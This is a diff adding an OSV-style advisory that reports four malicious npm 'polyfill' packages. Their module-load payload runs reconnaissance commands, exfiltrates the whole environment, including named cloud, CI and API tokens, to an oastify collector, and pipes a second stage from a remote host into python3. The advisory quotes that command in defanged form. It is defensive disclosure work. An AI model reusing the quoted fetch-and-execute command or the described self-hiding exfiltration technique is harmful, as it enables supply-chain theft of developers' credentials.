@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12577",
+  "aliases": [
+    "MAL-2026-17573"
+  ],
+  "modified": "2026-10-05T10:59:30Z",
+  "published": "2026-10-05T10:32:21Z",
+  "summary": "Malicious code in css-eqxcdx-polyfill (npm)",
+  "details": "Four npm packages — css-yhpodl-polyfill, css-eqxcdx-polyfill, css-kfvwax-polyfill and css-nrmgzn-polyfill (all @1.0.0) — ship an identical credential-stealing payload in package/thunderboltRegistry.js that runs as soon as the module is loaded. The package.json declares no install hooks and package/index.js is an empty stub; the payload is reached by requiring the bundled thunderboltRegistry.js, which also exports Proxy-based stubs under nine Adobe/Corvid registry names (thunderboltRegistry, siteAssetsRegistry, documentManagementRegistry, editorRegistry, corvidRegistry, dataBindingRegistry, autoCompleteRegistry, thunderboltBuilderRegistry, thunderboltPreviewRegistry) so the module reads as a legitimate registry polyfill. On load the file first deletes itself from require.cache so it cannot be found afterwards, then uses child_process.execSync to run `id`, `id -un`/`whoami`, `env`, `uname -a` and `ifconfig`/`ip addr`, and sends each result as a URL query string to hxxps://unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com/ (a Burp Collaborator-style collector), tagging every request with the victim hostname. The `cmd=env` request exfiltrates the entire process environment, including NPM_TOKEN, GITHUB_TOKEN/GH_TOKEN, NODE_AUTH_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, OPENAI_API_KEY, ANTHROPIC_API_KEY, STRIPE_SECRET_KEY, SLACK_TOKEN, GITLAB_TOKEN, CI_JOB_TOKEN, DOCKER_PASSWORD, DIGITALOCEAN_TOKEN, CLOUDFLARE_API_TOKEN, SENDGRID_API_KEY, TWILIO_AUTH_TOKEN, PYPI_TOKEN, HF_TOKEN, VERCEL_TOKEN, NETLIFY_AUTH_TOKEN and CARGO_REGISTRY_TOKEN. It then runs `curl -L hxxps://appsecc[.]com/py | python3` to fetch and execute a second-stage Python payload from a non-standard host, and posts a beacon (node version, platform, pid, timestamp) to the same collector. IOCs: C2/exfil collector hxxps://unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com/; second-stage payload host hxxps://appsecc[.]com/py.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "css-eqxcdx-polyfill",
+        "purl": "pkg:npm/css-eqxcdx-polyfill"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/css-eqxcdx-polyfill/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12577"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-05T10:32:21Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "appsecc[.]com",
+          "unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com"
+        ],
+        "sha256": [
+          "8e718c67f707af862eb9414feca62122471c9688c695f5fb4574cac8df85accf"
+        ],
+        "url_observed": [
+          "hxxps://appsecc[.]com/py",
+          "hxxps://unl9pgk6ei4uf80n5tf4iktspjvbuzkn9[.]oastify[.]com/"
+        ]
+      }
+    }
+  }
+}
